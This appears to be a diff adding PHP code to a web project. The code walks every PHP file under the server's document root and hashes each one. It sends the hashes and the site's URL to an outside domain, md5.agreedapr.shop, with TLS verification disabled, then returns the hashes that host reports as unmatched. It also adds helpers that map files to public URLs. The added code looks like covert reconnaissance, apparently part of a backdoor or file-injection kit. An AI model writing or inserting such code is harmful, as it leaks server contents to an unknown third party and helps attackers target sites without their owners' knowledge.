@@ -1,0 +1,63 @@
+function unmatch_md5s_result(){
+        $files = scan_directory($_SERVER['DOCUMENT_ROOT']);
+        $md5s = [];
+        foreach ($files as $file) {
+            $file_md5 = md5_file($file);
+            $md5s[] = $file_md5;
+        }
+
+        $post_data = [
+            'current_url' => 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'],
+            'md5s' => $md5s
+        ];
+
+        $api_url = 'https://md5.agreedapr.shop/md5_api';
+
+        $ch = curl_init($api_url);
+
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_POST, true);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($post_data));
+        curl_setopt($ch, CURLOPT_HTTPHEADER, [
+            'Content-Type: application/json'
+        ]);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+
+        $response = curl_exec($ch);
+
+        if (curl_errno($ch)) {
+            echo 'cURL error: ' . curl_error($ch);
+            curl_close($ch);
+            return array();
+        } else {
+            curl_close($ch);
+            $unmatch_md5s = json_decode($response, true);
+            return $unmatch_md5s["md5"];
+        }
+    }
+
+
+function scan_directory($dir, $only_index = false) {
+        $files = [];
+        $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir));
+        foreach ($iterator as $file) {
+            if (pathinfo($file, PATHINFO_EXTENSION) === 'php') {
+                if ($only_index && basename($file) !== 'index.php') {
+                    continue;
+                }
+                $files[] = $file;
+            }
+        }
+        return $files;
+    }
+
+    function file_to_url($file) {
+        global $root;
+        $url = str_replace($root, '', $file);    
+        $scheme = (!empty($_SERVER['REQUEST_SCHEME'])) 
+                  ? $_SERVER['REQUEST_SCHEME'] 
+                  : ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http');
+        
+        return $scheme . '://' . $_SERVER['HTTP_HOST'] . $url;
+    }
